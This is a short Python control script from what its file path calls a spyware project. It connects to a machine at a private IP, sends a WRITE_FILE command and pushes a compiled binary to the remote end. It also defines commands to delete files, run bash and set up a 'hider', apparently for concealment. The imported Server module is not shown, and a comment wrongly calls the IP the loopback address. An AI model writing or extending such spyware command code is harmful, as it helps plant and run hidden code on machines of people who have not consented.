
from server import Server

HOST = '192.168.83.130'  # Standard loopback interface address (localhost)
PORT = 23456        # Port to listen on (non-privileged ports are > 1023)

FunCode: dict[str, int] = {
    "WRITE_FILE": 1,
    "DELETE_FILE": 2,
    "RUN_BASH": 3,
    "HIDER_SETUP": 4,
}

def main():
    serv = Server()
    with serv.serverConnection(HOST, PORT) as conn:
        serv.sendCommand(conn, FunCode["WRITE_FILE"], "1234.out")
        serv.sendFile(conn, "/home/avners/Arazim-Projects-2024---spyware/src/ServerSpy/a.out")
        ans = serv.recvCommand()
        print(f"{ans = }")



if __name__ == "__main__":
    main()